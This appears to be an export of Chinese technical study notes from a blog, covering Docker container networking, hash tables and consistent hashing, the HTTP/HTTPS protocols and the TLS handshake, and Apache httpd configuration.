<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run -d -P —name <span class="string">&quot;tomcat02&quot;</span> —<span class="built_in">link</span> tomcat01 tomcat</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker exec-it tomcat02 ping tomcat01  //ok</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker exec-it tomcat01 ping tomcat02 //no</span><br></pre></td></tr></table></figure>

<p>如果需要tomcat01能够通过服务名ping通tomcat02 需要为tomcat01也设置—link</p>
<p>本质是在&#x2F;etc&#x2F;hosts 文件中配置了映射</p>
<p>可以看出docker0不支持通过容器名来实现容器间的通信</p>
<p>新手入门级，现已不推荐使用</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker network inspect  容器<span class="built_in">id</span></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker network <span class="built_in">ls</span> //列出所有网络</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker network <span class="built_in">rm</span> //删除一个网络</span><br></pre></td></tr></table></figure>

<h2 id="自定义网络"><a href="#自定义网络" class="headerlink" title="自定义网络"></a>自定义网络</h2><p>docker网络模式</p>
<p>bridge &#x2F;&#x2F;桥接</p>
<p>none &#x2F;&#x2F;不配置网络</p>
<p>host &#x2F;&#x2F;和宿主机共享网络</p>
<p>container &#x2F;&#x2F;容器间网络联通</p>
<p>docker run -d —name “tomcat” —net bridge tomcat  &#x2F;&#x2F;—net 为默认参数，不写也会自动添加、</p>
<p><code>docker network create —driver bridge —subnet 192.168.0.0/16 —gateway 192.168.0.1 mynet(网络名)  //自定义一个网络</code></p>
<p>使用自定义网络启动容器</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run -d -P  —name <span class="string">&quot;container_mynet_01&quot;</span> —net mynet tomcat</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run -d -P  —name <span class="string">&quot;container_mynet_02&quot;</span> —net mynet tomcat</span><br></pre></td></tr></table></figure>

<p>通过该方法运行的容器，可以通过容器名会互相ping通</p>
<p>同时可为不同的集群创建不同的网络，从而保证了网络的健康，提升了网络的安全性</p>
<h2 id="网络连通"><a href="#网络连通" class="headerlink" title="网络连通"></a>网络连通</h2><p>连接不同的网络，不是直接打通不同的网络，而是将不同网络的容器同网络联通</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker network connect  网络名 容器名 //将容器连接到网络上，实质是将容器直接放到网络下面，相当于一个容器拥有了两个IP</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>安全技术</category>
        <category>容器</category>
      </categories>
      <tags>
        <tag>Docker</tag>
        <tag>容器</tag>
      </tags>
  </entry>
  <entry>
    <title>HASH表与一致性HASH</title>
    <url>/archives/810d7b26.html</url>
    <content><![CDATA[<h1 id="HASH表与一致性HASH"><a href="#HASH表与一致性HASH" class="headerlink" title="HASH表与一致性HASH"></a>HASH表与一致性HASH</h1><h1 id="哈希表的基本认识"><a href="#哈希表的基本认识" class="headerlink" title="哈希表的基本认识"></a>哈希表的基本认识</h1><hr>
<p>哈希表也叫做散列表，是一种数据结构，他提供了快速的查询以及查询操作，无论哈希表中有多少条数据，他的查找的时间复杂度都是O(1)</p>
<p>哈希表是基于数组原理的，所以导致其扩容测成本非常的高，当哈希表被填满的时候，性能下降非常严重</p>
<p>哈希表运用的就是一种转换的思想，将查询的键转换为数组的下标，在哈希表中这个过程通过哈希函数来完成。</p>
<p>举个例子:</p>
<p><code>我们上学的时候，大家都会有一个学号「1-n号」中的一个号码，如果我们用哈希表来存放班级里面学生信息的话，我们利用学号作为「键」或者「关键字」，这个「键」或者「关键字」就可以直接作为数据的下标，不需要通过哈希函数进行转化。如果我们需要安装学生姓名作为「键」或者「关键字」，这时候我们就需要哈希函数来帮我们转换成数组的下标。</code></p>
<h1 id="哈希函数"><a href="#哈希函数" class="headerlink" title="哈希函数"></a>哈希函数</h1><hr>
<p>哈希函数的作用就是帮我们把非整型的数据转换为整型来充当数组的下标</p>
<p><img src="/archives/810d7b26/Untitled.png"></p>
<p>哈希函数要满足如下原则：</p>
<ol>
<li>哈希函数生成的值不能为负数</li>
<li>同一个键经过哈希函数运算后得到的下标必须是一致的</li>
</ol>
<p>通过上面你的描述可以看出，哈希函数生成的下标是可能存在重复的，如student 何student1两个键生成的下标可能相等同为1，那么这时通过哈希表查询的数据就是不准确的，我们把巨大的空间转换为较小的数组空间的时候，不可避免地会出现重复地现象，这个现象就叫做<code>哈希冲突</code>。哈希冲突是不可避免地，我们通过<code>开放地址法</code>与<code>链表法</code>来解决这个问题。</p>
<h1 id="哈希冲突的解决"><a href="#哈希冲突的解决" class="headerlink" title="哈希冲突的解决"></a>哈希冲突的解决</h1><hr>
<h2 id="开放地址法"><a href="#开放地址法" class="headerlink" title="开放地址法"></a>开放地址法</h2><hr>
<h3 id="线性探测"><a href="#线性探测" class="headerlink" title="线性探测"></a>线性探测</h3><hr>
<p><strong>线性探测的插入</strong></p>
<p>一个键经过哈希运算后，准备将其对应的数据插入到计算出来的下标对应的数组的位置时，发现该位置已经有值了，此时会按照顺序依次向下探测下一个下标，直到找到一个空的位置为止</p>
<p><strong>线性探测的查找</strong></p>
<p>通过散列函数计算处键值对应的数组下标，到哈希表中去查找，然后比较对应位置的键值与计算得出的键值，如果相等则匹配到了数据，如果不相等，则依次向下查找，直到找到位置</p>
<p><strong>线性探测的删除</strong></p>
<p>如果直接删除对应下标处的数据的话，会导致后续的查询操作过程中不能查找到正确的值，比如键值a计算得到的哈希值为3，但再插入的时候，3对应的位置已经有值了，依次遍历到位置5后成功插入。那么再删除了3对应位置的值之后，再查询a对应数据的过程中，首先计算出来的下标为3，那么就去3对应的位置找，结果发现时空白，于是认为，键值a,不在该哈希表中，这很显然时不正确的。为了解决这一问题，我们可以为被删除的位置插入一个特殊的标志位，即将该位置的数组下标设为-1来标识该处数据被删除。这样会带来一个问题，如果在线性探测哈希表中做了多次操作，会导致哈希表中充满了学号为-1的数据项，使的哈希表的效率下降，所以很多哈希表中没有提供删除操作，即使提供了删除操作的，也尽量少使用删除函数。</p>
<p><img src="/Untitled%201.png"></p>
<h3 id="二次探测"><a href="#二次探测" class="headerlink" title="二次探测"></a>二次探测</h3><hr>
<p>在线性探测哈希表中，数据会发生聚集，一旦聚集形成，它就会变的越来越大，那些哈希函数后落在聚集范围内的数据项，都需要一步一步往后移动，并且插入到聚集的后面，因此聚集变的越大，聚集增长的越快。这个就像我们在逛超市一样，当某个地方人很多时，人只会越来越多，大家都只是想知道这里在干什么。</p>
<p>二次探测是防止聚集产生的一种尝试，思想是探测相隔较远的单元，而不是和原始位置相邻的单元。在线性探测中，如果哈希函数得到的原始下标是x,线性探测就是x+1,x+2,x+3……，以此类推，而在二次探测中，探测过程是x+1,x+4,x+9,x+16,x+25……,以此类推，到原始距离的步数平方，为了方便理解，我们来看下面这张图</p>
<p><img src="/Untitled%202.png"></p>
<p>二次探测消除了线性探测的聚集问题，这种聚集问题叫做原始聚集，然而，二次探测也产生了新的聚集问题，之所以会产生新的聚集问题，是因为所有映射到同一位置的关键字在寻找空位时，探测的位置都是一样的。</p>
<p>比如讲1、11、21、31、41依次插入到哈希表中，它们映射的位置都是1，那么11需要以一为步长探测，21需要以四为步长探测，31需要为九为步长探测，41需要以十六为步长探测，只要有一项映射到1的位置，就需要更长的步长来探测，这个现象叫做二次聚集。</p>
<h3 id="双哈希"><a href="#双哈希" class="headerlink" title="双哈希"></a>双哈希</h3><hr>
<p>双哈希是为了消除原始聚集和二次聚集问题，不管是线性探测还是二次探测，每次的探测步长都是固定的。双哈希是除了第一个哈希函数外再增加一个哈希函数用来根据关键字生成探测步长，这样即使第一个哈希函数映射到了数组的同一下标，但是探测步长不一样，这样就能够解决聚集的问题。</p>
<p><img src="/Untitled%203.png"></p>
<p>第二个哈希函数必须满足：</p>
<ol>
<li>和第一个哈希函数不一样</li>
<li>不能为0</li>
</ol>
<p>哈希表的容量必须是一个质数：</p>
<p>假设我们哈希表的容量为15，某个**「关键字」**经过双哈希函数后得到的数组下标为0，步长为5。那么这个探测过程是0,5,10,0,5,10，一直只会尝试这三个位置，永远找不到空白位置来存放，最终会导致崩溃。</p>
<p>如果我们哈希表的大小为13，某个**「关键字」**经过双哈希函数后得到的数组下标为0，步长为5。那么这个探测过程是0,5,10,2,7,12,4,9,1,6,11,3。会查找到哈希表中的每一个位置。</p>
<p>使用开放地址法，不管使用那种策略都会有各种问题，开放地址法不怎么使用，在开放地址法中使用较多的是双哈希策略。</p>
<h2 id="链表法"><a href="#链表法" class="headerlink" title="链表法"></a>链表法</h2><hr>
<p>开放地址法中，通过在哈希表中再寻找一个空位解决冲突的问题，还有一种更加常用的办法是使用「链表法」来解决哈希冲突。「链表法」相对简单很多，「链表法」是每个数组对应一条链表。当某项关键字通过哈希后落到哈希表中的某个位置，把该条数据添加到链表中，其他同样映射到这个位置的数据项也只需要添加到链表中，并不需要在原始数组中寻找空位来存储。下图是「链表法」的示意图。</p>
<p><img src="/Untitled%204.png"></p>
<h1 id="一致性哈希"><a href="#一致性哈希" class="headerlink" title="一致性哈希"></a>一致性哈希</h1><hr>
<p>在进行负载均衡调度的时候，往往用到哈希算法，通过哈希函数，将数据映射到对应的服务器集群上面，传统的哈希函数存在着可扩展性差，容错能力差的问题</p>
<h2 id="可扩展性"><a href="#可扩展性" class="headerlink" title="可扩展性"></a><strong>可扩展性</strong></h2><hr>
<p>假设有 3 个服务器节点编号 [0 - 2]，6 个缓存键值对编号 [1 - 6]，则完成哈希映射之后，三个缓存数据映射情况如下：</p>
<p>哈希计算公式：key % 节点总数 &#x3D; Hash节点下标</p>
<p>1 % 3 &#x3D; 1</p>
<p>2 % 3 &#x3D; 2</p>
<p>3 % 3 &#x3D; 0</p>
<p>4 % 3 &#x3D; 1</p>
<p>5 % 3 &#x3D; 2</p>
<p>6 % 3 &#x3D; 0</p>
<p><img src="/Untitled%205.png"></p>
<p>每个连接都均匀的分散到了三个不同的服务器节点上，看起来很完美！</p>
<p>但是，在分布式集群系统的负载均衡实现上，这种模型有两个问题：</p>
<p><strong>扩展能力差</strong></p>
<p>为了动态调节服务能力，服务节点经常需要扩容缩容。打个比方，如果是电商服务，双十一期间的服务机器数量肯定要比平常大很多，新加进来的机器会使原来计算的哈希值不准确，为了达到负载均衡的效果，要重新计算并更新哈希值，对于更新后哈希值不一致的缓存数据，要迁移到更新后的节点上去。</p>
<p>假设新增了 1 个服务器节点，由原来的 3 个服务节点变成 4 个节点编号 [0 - 3]，哈希映射情况如下：</p>
<p>哈希计算公式：key % 节点总数 &#x3D; Hash节点下标</p>
<p>1 % 4 &#x3D; 1</p>
<p>2 % 4 &#x3D; 2</p>
<p>3 % 4 &#x3D; 3</p>
<p>4 % 4 &#x3D; 0</p>
<p>5 % 4 &#x3D; 1</p>
<p>6 % 4 &#x3D; 2</p>
<p>可以看到后面三个缓存 key ：4、5、6 对应的存储节点全部失效了，这就需要把这几个节点的缓存数据迁移到更新后的节点上 (费时费力) ，也就是由原来的节点 [1, 2, 0] 迁移到节点 [0, 1, 2]，迁移后存储示意图如下：</p>
<p><img src="/Untitled%206.png"></p>
<p><strong>容错能力不佳</strong></p>
<p>线上环境服务节点虽然有各种高可用性保证，但还是是有宕机的可能，即使没有宕机也有缩容的需求。不管是宕机和缩容都可以归结为服务节点删除的情况，下面分析下服务节点删除对负载均衡哈希值的影响。</p>
<p>假设删除 1 个服务器节点，由最初的 3 个服务节点变成 2 个，节点编号 [0 - 1]，哈希映射情况如下：</p>
<p>哈希计算公式：key % 节点总数 &#x3D; Hash节点下标</p>
<p>1 % 2 &#x3D; 1</p>
<p>2 % 2 &#x3D; 0</p>
<p>3 % 2 &#x3D; 1</p>
<p>4 % 2 &#x3D; 0</p>
<p>5 % 2 &#x3D; 1</p>
<p>6 % 2 &#x3D; 0</p>
<p>下图展示普通哈希负载均衡算法在一个节点宕机时候，导致的的缓存数据迁移分布</p>
<p><img src="/Untitled%207.png"></p>
<p>如图所见，在这个例子中，仅仅删除了一个服务节点，也导致了哈希值的大面积更新，哈希值的更新也是意味着节点缓存数据的迁移。</p>
<h2 id="一致性哈希-1"><a href="#一致性哈希-1" class="headerlink" title="一致性哈希"></a>一致性哈希</h2><hr>
<p>一句话概括一致性哈希：就是普通取模哈希算法的改良版，哈希函数计算方法不变，只不过是通过构建环状的 Hash 空间代替普通的线性 Hash 空间。具体做法如下：</p>
<p>首先，选择一个足够大的Hash空间（一般是 0 ~ 2^32）构成一个哈希环。</p>
<p><img src="/Untitled%208.png"></p>
<p>然后，对于缓存集群内的每个存储服务器节点计算 Hash 值，可以用服务器的 IP 或 主机名计算得到哈希值，计算得到的哈希值就是服务节点在 Hash 环上的位置。</p>
<p><img src="/Untitled%209.png"></p>
<p>最后，对每个需要存储的数据 key 同样也计算一次哈希值，计算之后的哈希也映射到环上，数据存储的位置是沿顺时针的方向找到的环上的第一个节点。下图举例展示了节点存储的数据情况，我们下面的说明也是基于目前的存储情况来展开。</p>
<p><img src="/Untitled%2010.png"></p>
<p>原理讲完了，来看看为什么这样的设计能解决上面普通哈希的两个问题。</p>
<p><strong>扩展能力提升</strong></p>
<p>前面我们分析过，普通哈希算法当需要扩容增加服务节点的时候，会导致原油哈希映射大面积失效。现在，我们来看下一致性哈希是如何解决这个问题的。</p>
<p>如下图所示，当缓存服务集群要新增一个节点node3时，受影响的只有 key3 对应的数据 value3，此时只需把 value3 由原来的节点 node0 迁移到新增节点 node3 即可，其余节点存储的数据保持不动。</p>
<p><img src="/Untitled%2011.png"></p>
<p><strong>容错能力提升</strong></p>
<p>普通哈希算法当某一服务节点宕机下线，也会导致原来哈希映射的大面积失效，失效的映射触发数据迁移影响缓存服务性能，容错能力不足。一起来看下一致性哈希是如何提升容错能力的。</p>
<p>如下图所示，假设 node2 节点宕机下线，则原来存储于 node2 的数据 value2 和 value5 ，只需按顺时针方向选择新的存储节点 node0 存放即可，不会对其他节点数据产生影响。一致性哈希能把节点宕机造成的影响控制在顺时针相邻节点之间，避免对整个集群造</p>
<p><img src="/Untitled%2012.png"></p>
<p><strong>一致性哈希优化</strong></p>
<p><strong>存在的问题</strong></p>
<p>上面展示了一致性哈希如何解决普通哈希的扩展和容错问题，原理比较简单，在理想情况下可以良好运行，但在实际使用中还有一些实际问题需要考虑，下面具体分析。</p>
<p><strong>数据倾斜</strong></p>
<p>试想一下若缓存集群内的服务节点比较少，就像我们例子中的三个节点，而哈希环的空间又有很大（一般是 0 ~ 2^32），这会导致什么问题呢？</p>
<p>可能的一种情况是，较少的服务节点哈希值聚集在一起，比如下图所示这种情况 node0 、node1、node2 聚集在一起，缓存数据的 key 哈希都映射到 node2 的顺时针方向，数据按顺时针寻找存储节点就导致全都存储到 node0 上去，给单个节点很大的压力！这种情况称为数据倾斜。</p>
<p><img src="/Untitled%2013.png"></p>
<p><strong>节点雪崩</strong></p>
<p>数据倾斜和节点宕机都可能会导致缓存雪崩。</p>
<p>拿前面数据倾斜的示例来说，数据倾斜导致所有缓存数据都打到 node0 上面，有可能会导致 node0 不堪重负被压垮了，node0 宕机，数据又都打到 node1 上面把 node1 也打垮了，node1 也被打趴传递给 node2，这时候故障就像像雪崩时滚雪球一样越滚越大。</p>
<p>还有一种情况是节点由于各种原因宕机下线。比如下图所示的节点 node2 下线导致原本在node2 的数据压到 node0 , 在数据量特别大的情况下也可能导致节点雪崩，具体过程就像刚才的分析一样。</p>
<p>总之，连锁反应导致的整个缓存集群不可用，就称为节点雪崩。</p>
<p><img src="/Untitled%2014.png"></p>
<p><strong>虚拟节点</strong></p>
<p>那该如何解决上述两个棘手的问题呢？可以通过「虚拟节点」的方式解决。</p>
<p>所谓虚拟节点，就是对原来单一的物理节点在哈希环上虚拟出几个它的分身节点，这些分身节点称为「虚拟节点」。打到分身节点上的数据实际上也是映射到分身对应的物理节点上，这样一个物理节点可以通过虚拟节点的方式均匀分散在哈希环的各个部分，解决了数据倾斜问题。</p>
<p>由于虚拟节点分散在哈希环各个部分，当某个节点宕机下线，他所存储的数据会被均匀分配给其他各个节点，避免对单一节点突发压力导致的节点雪崩问题。</p>
<p>下图展示了虚拟节点的哈希环分布，其中左边是没做虚拟节点情况下的节点分布，右边背景色绿色两个的 node0 节点是 node0 节点的虚拟节点；背景色红色的 node1 节点是 node1 的虚拟节点。</p>
<p><img src="/Untitled%2015.png"></p>
]]></content>
      <categories>
        <category>安全技术</category>
        <category>Hash</category>
      </categories>
      <tags>
        <tag>HASH表</tag>
        <tag>一致性HASH</tag>
      </tags>
  </entry>
  <entry>
    <title>HTTP-HTTPS协议</title>
    <url>/archives/ac8f02b1.html</url>
    <content><![CDATA[<h1 id="HTTP-HTTPS协议"><a href="#HTTP-HTTPS协议" class="headerlink" title="HTTP&#x2F;HTTPS协议"></a>HTTP&#x2F;HTTPS协议</h1><h1 id="HTTP"><a href="#HTTP" class="headerlink" title="HTTP"></a>HTTP</h1><h2 id="HTTP概述"><a href="#HTTP概述" class="headerlink" title="HTTP概述"></a>HTTP概述</h2><p>http-超文本标记语言，属于七层应用层协议，默认端口号80，基于tcp的协议。</p>
<p>http协议是无连接，无状态的一种协议</p>
<p>无连接：每次连接只处理一个请求</p>
<p>无状态：对事务处理没有记忆能力</p>
<p>HTTP使用统一资源标识符（Uniform Resource Identifiers, URI）来传输数据和建立连接。URL是一种特殊类型的URI，包含了用于查找某个资源的足够的信息</p>
<p>URI:一种抽象的标识资源的方法，并不能定位资源</p>
<p>URL:即可标识资源，也可定位资源</p>
<p>URN：仅是资源的一种命名标准</p>
<p>URL包括以下部分：</p>
<p>协议部分:&#x2F;&#x2F;用户名:密码@域名部分&#x2F;虚拟目录部分&#x2F;文件名部分?参数部分#锚部分</p>
<h2 id="HTTP版本区别"><a href="#HTTP版本区别" class="headerlink" title="HTTP版本区别"></a>HTTP版本区别</h2><p>http1.1对比http1.0：使用了管道化技术，加入了长连接功能。此时一个http连接可以同时发送多个http请求，但是对于回包来说，无法分别出是属于哪个请求的，还是必须要去按照请求的顺序返回，这就导致了一个兼做<code>线头阻塞</code>  的问题，同时http1.1也不支持服务端推送功能</p>
<p>http2.0：增加了服务端推送，通过帧、流等手法解决了线头阻塞的问题，再一个连接中，可以发送多个请求，一个请求时一个流，一个流被分成很多帧。使用了标志位来区分不同的请求</p>
<h2 id="HTTP头"><a href="#HTTP头" class="headerlink" title="HTTP头"></a>HTTP头</h2><h3 id="HTTP请求头"><a href="#HTTP请求头" class="headerlink" title="HTTP请求头"></a>HTTP请求头</h3><p>**请求行 ：**请求方法 请求资源 协议类型 版本号</p>
<p>**请求头：**包括请求主机、用户代理、referer、cookie、accept、accept-encoding、accept-language、cache-control、connection、if-none-match等lastmodified</p>
<p>**空行：**分割请求头与请求体</p>
<p><strong>请求体</strong>：请求参数</p>
<p>请求方法包括get、post、put、delete、connection等</p>
<h3 id="HTTP响应头"><a href="#HTTP响应头" class="headerlink" title="HTTP响应头"></a>HTTP响应头</h3><p>**状态行：**协议类型 版本号 响应码 响应消息</p>
<p>**响应头：**日期、set-cookie、access-control-allow-origain、connection、content-encoding、content-Type、etag、vary、 x-xss-protection、x-frame-options</p>
<p>空行：</p>
<p><strong>响应体：</strong></p>
<p><strong>GET与PSOT的区别</strong></p>
<ol>
<li>get提交的数据会放在url中，post提交的数据存放在请求体中</li>
<li>GET方法提交的数据有大小限制，浏览器对url长度有限制4k,post方法无</li>
<li>GET方式提交的数据直接存放在url中，不安全。</li>
</ol>
<h1 id="HTTPS"><a href="#HTTPS" class="headerlink" title="HTTPS"></a>HTTPS</h1><p>以下笔记参考</p>
<p><a href="https://www.jianshu.com/p/a3a25c6627ee">Https详解+wireshark抓包演示</a></p>
<p>我们知道http协议是无状态、无连接的一种明文传输的协议。那么在传输过程中我们的数据就可能会被不法分子所劫持、篡改等。</p>
<p>https的原理就是在原来http协议的基础上添加了一层安全套接层ssl对传输的数据进行加密。我们在tcp三次握手完成后，正式传输数据前还需要进行ssl握手交换彼此的密钥、证书。</p>
<h2 id="https握手过程"><a href="#https握手过程" class="headerlink" title="https握手过程"></a>https握手过程</h2><p><img src="/archives/ac8f02b1/Untitled.png"></p>
<h3 id="Step1：Client-Hello"><a href="#Step1：Client-Hello" class="headerlink" title="Step1：Client Hello"></a>Step1：Client Hello</h3><p>报文包含：</p>
<ol>
<li>TLS版本</li>
<li>随机数：random1 包含两部分：时间戳（4字节）+随机数（28字节</li>
<li>session-id:用来表明一次会话，第一次建立没有。如果以前建立过，可以直接带过</li>
<li>加密算法套装列表：客户端支持的加密-签名算法列</li>
<li>压缩算法：一般不适</li>
<li>扩展字段：密码交换算法的参数、请求主机的名字</li>
</ol>
<h3 id="Step2：Server-Hello"><a href="#Step2：Server-Hello" class="headerlink" title="Step2：Server Hello"></a>Step2：Server Hello</h3><p>报文包括：</p>
<ol>
<li>TLS版本号：和客户端上传的版本号对比，使用相应的版本</li>
<li>确定加密套件，压缩算法</li>
<li>产生一个随机数random2,此时客户端与服务端都拥有了两个随机数</li>
</ol>
<h3 id="Step3：Server-⇒-Client"><a href="#Step3：Server-⇒-Client" class="headerlink" title="Step3：Server ⇒ Client"></a>Step3：Server ⇒ Client</h3><p>报文包括：</p>
<ol>
<li><p>Certificat: 服务器向CA申请的证书</p>
</li>
<li><p>Server Key Exchange:</p>
<p> 这个消息是用来发送密钥交换算法相关参数和数据的。这里要提前提一下，就是根据密钥交换算法的不同，传递的参数也是不同的。<br> 常用的密钥交换算法：RSA、DH（Diffie-Hellman）、ECDH（Ellipticcurve Diffie–Hellman）。</p>
</li>
<li><p>Server Hello Done:用来表示服务端说完了。</p>
</li>
</ol>
<p>客户端拿到证书后，通过保存在本机的根证书，验证该证书是否合法，取得证书中的公钥。</p>
<h3 id="Step4：Client-Server"><a href="#Step4：Client-Server" class="headerlink" title="Step4：Client &#x3D;&gt; Server"></a>Step4：Client &#x3D;&gt; Server</h3><p>报文包括</p>
<ol>
<li>Client Key Exchange：交换密钥参数，此时客户端会生成一个随机数random3,然后使用从服务端哪里获取的公钥进行加密得到密文，然后发送到服务端，服务端收到这个值后，使用自己的私钥进行解密，此时服务器与客户端就都有了三个随机数了。</li>
<li>Change Cipher Spec:编码改变通知。这一步是客户端通知服务端后面再发送的消息都会使用前面协商出来的秘钥加密了，是一条事件消息。</li>
<li>Encrypted Handshake Message:这一步对应的是 Client Finish 消息，客户端将前面的握手消息生成摘要(随机数)再用协商好的秘钥加密，这是客户端发出的第一条加密消息。服务端接收后会用秘钥解密，能解出来说明前面协商出来的秘钥是一致的。</li>
</ol>
<h3 id="Step5：Server-⇒-Client"><a href="#Step5：Server-⇒-Client" class="headerlink" title="Step5：Server ⇒ Client"></a>Step5：Server ⇒ Client</h3><p>报文包括</p>
<ol>
<li>New Session Ticket:包含了一个加密通信所需要的信息，这些数据采用一个只有服务器知道的密钥进行加密。目标是消除服务器需要维护每个客户端的会话状态缓存的要求。这部分内容在后面的扩展部分会讲到</li>
<li>Change Cipher Spec:编码改变通知。这一步是服务端通知客户端后面再发送的消息都会使用加密，也是一条事件消息。</li>
<li>Encrypted Handshake Message:这一步对应的是 Server Finish 消息，服务端也会将握手过程的消息生成摘要再用秘钥加密，这是服务端发出的第一条加密消息。客户端接收后会用秘钥解密，能解出来说明协商的秘钥是一致的。</li>
</ol>
<h2 id="我们为什么需要https"><a href="#我们为什么需要https" class="headerlink" title="我们为什么需要https"></a>我们为什么需要https</h2><p>http协议在互联网上是明文传输的，那么就可能存在数据被截获、篡改的可能。为了信息安全于是在http协议的基础上添加了一层安全套接层，也就是ssl。ssl现在已经发展到TLS了，当前主流的使用也是TLS方式加密。那么这个加密过程到底是怎样的呢。首先我们需要了解两种加密方式。对称加密于非对称加密。</p>
<p>对称加密也就是，通信双方公用同一个密钥进行加密与解密，那么问题来了，双方要进行对称加密通信则必须要进行交换密钥的操作，交换密钥的过程势必使明文传输的，那么密钥就存在泄露的风险，那么对称加密通信也就不再安全了。</p>
<p>非对称加密，通信双方使用各自的公钥私钥进行同行，私钥进行加密，公钥进行验证，私钥加密的数据只能被公钥解密，公钥加密的数据只能被私钥解密，私钥只有发信方本人知道，公钥向与之通信的人公开，那么通过公钥加密的数据就只能被拥有私钥的接收方解密，但通过私钥加密的数据却能被所有拥有公钥的人解密，且通过公钥加密的数据虽然保证了安全性，但数据完整性却没有得到保证，其仍存在被篡改的可能，为了解决数据完整性与公钥加密数据的安全性问题，我们又引入另外两个概念CA与数字摘要、数字签名。</p>
<p>既然数据可能在传输过程中被篡改，那么我们只需要让数据接收方能够通过一个特征验证数据的真伪就可以了，这个验证特征就是数字摘要，将源数据通过哈希算法进行散列得到一个摘要随着数据一同发送。哈希算法的特征保证了哈希值的基本唯一性，所以我们可以在接受到数据后对收到的数据使用同样的hash算法，得到一个hash值对比接收到的hash值，如果两者一致，那么就保证了数据没有被篡改过。那么为什么又需要数字签名呢，前面提到了，摘要如果明文传输的话，就可能被截获，并整个篡改。</p>
<h1 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h1><h1 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h1><h2 id="胖客户端"><a href="#胖客户端" class="headerlink" title="胖客户端"></a>胖客户端</h2><p>请求的资源在客户端加载运行</p>
<p>不安全</p>
<h2 id="瘦客户端"><a href="#瘦客户端" class="headerlink" title="瘦客户端"></a>瘦客户端</h2><p>请求的资源在服务器运行完返回运行结果</p>
<h1 id="服务器"><a href="#服务器" class="headerlink" title="服务器"></a>服务器</h1><h2 id="动态的web服务器"><a href="#动态的web服务器" class="headerlink" title="动态的web服务器"></a>动态的web服务器</h2><p>执行代码，返回运行结果</p>
<p>php-php服务器 </p>
<p>jsp-tomcat</p>
<p>asp-iis</p>
<h2 id="静态的web服务器"><a href="#静态的web服务器" class="headerlink" title="静态的web服务器"></a>静态的web服务器</h2><p>直接返回原资源</p>
<p>apache ngix iis</p>
<h1 id="http状态码"><a href="#http状态码" class="headerlink" title="http状态码"></a>http状态码</h1><p>100 提示信息</p>
<p>200 成功</p>
<p>300 重定向</p>
<p>301 永久重定向</p>
<p>302 临时重定向</p>
<p>400 客户端错误</p>
<p>403 forbiden</p>
<p>404 not found</p>
<p>500 服务端错误</p>
<p>501 网关错误</p>
<p>http协议是一种无状态的协议，每次只能请求一个资源，如果想一次请求多个资源，可以使用到长连接，长连接通过时间与连接数量来控制生存时间，从而不然该连接占据太多的带宽</p>
<p>cd &#x2F;etc&#x2F;httpd&#x2F;conf.d&#x2F;</p>
<p>touch keepalive.conf</p>
<p>写入以下内容</p>
<p>KeepAlive on</p>
<p>MaxKeepAliveRequests 500</p>
<p>KeepAliveTimeout 5</p>
<p>设置长连接</p>
<p>restful 风格，基于路径的风格,主流风格</p>
<h1 id="APACHE-HTTPD"><a href="#APACHE-HTTPD" class="headerlink" title="APACHE-HTTPD"></a>APACHE-HTTPD</h1><h1 id="httpd主配置文件"><a href="#httpd主配置文件" class="headerlink" title="httpd主配置文件"></a>httpd主配置文件</h1><h2 id="全局配置"><a href="#全局配置" class="headerlink" title="全局配置"></a>全局配置</h2><p>ServerRoot “&#x2F;etc&#x2F;httpd” &#x2F;&#x2F;设置配置文件的根目录，该配置文件中后面的所有相对路径都是基于该目录开始的</p>
<p>Listen 80 &#x2F;&#x2F;配置监听的端口，可复写多个</p>
<p>Listen ipaddr:80</p>
<p>User apache</p>
<p>Group apache &#x2F;&#x2F;以什么身份运行</p>
<p>ServerAdmin root@localhost &#x2F;&#x2F;报错信息发送目标</p>
<h2 id="中心主机配置"><a href="#中心主机配置" class="headerlink" title="中心主机配置"></a>中心主机配置</h2><p>DocumentRoot “&#x2F;var&#x2F;www&#x2F;html” &#x2F;&#x2F;中心主机根目录</p>
<p>&lt;Location “url”&gt;</p>
<p>基于url的权限设置</p>
</Location>

<p>&lt;files “本地文件路径”&gt;</p>
<p>针对文件的权限设置</p>
</files>

<p>&lt;Directory “本地目录”&gt;</p>
<p>require all granted|denied</p>
<p>Allowoverride all|none|directive_type &#x2F;&#x2F;与.htaccess文件相关，如果设置为允许，则如果该文件中的directory与配置文件中的directory冲突，配置文件中的内容将被覆盖。</p>
<p>Options Indexes|FollowSymboLinks|none|all</p>
<p>require ip ipaddr granted|denied &#x2F;&#x2F;按ip配置权限</p>
<p>AuthType Basic &#x2F;&#x2F;认证类型</p>
<p>AuthName “请输入你的用户名” &#x2F;&#x2F;要认证的用户</p>
<p>AuthUserFile “&#x2F;etc&#x2F;httpd&#x2F;.htpasswd” &#x2F;&#x2F;合法用户列表</p>
<p>Require valid-user &#x2F;&#x2F; 合法的用户均可访问该目录 </p>
</directory>

<p>htpasswd -c 文件 新建的用户名 &#x2F;&#x2F;配置了认证选项之后，执行命令，创建可供登录的用户  <a href="//window">&#x2F;&#x2F;window</a> 同样有该命令</p>
<IFModule dir_module>

<p>DirectoryIndex index.html &#x2F;&#x2F;如果存在dir_module模块则，设置默认页面为index.html</p>
</IFModule>

<p>Errorlog “本地目录”</p>
<p>LogLevel warn <a href="//debug">&#x2F;&#x2F;debug</a> info notice warn error crit alert emerg  记录大于或者等于warn的错误日志</p>
<IfModule log_config_module>

<p>LogFormat “%h %u %l %t &quot;%r&quot; &quot;%{Referer}i&quot;“  combined &#x2F;&#x2F;访问日志文件格式，最后为名称</p>
<p>CustomLog “访问日志路径” combined(启用的格式)</p>
</IfModule>

<IFModule alias_module>

<p><strong><code>Alias /webpath 本地文件路径 //将本地文件路径映射到url路径</code>  &#x2F;&#x2F;restful风格</strong></p>
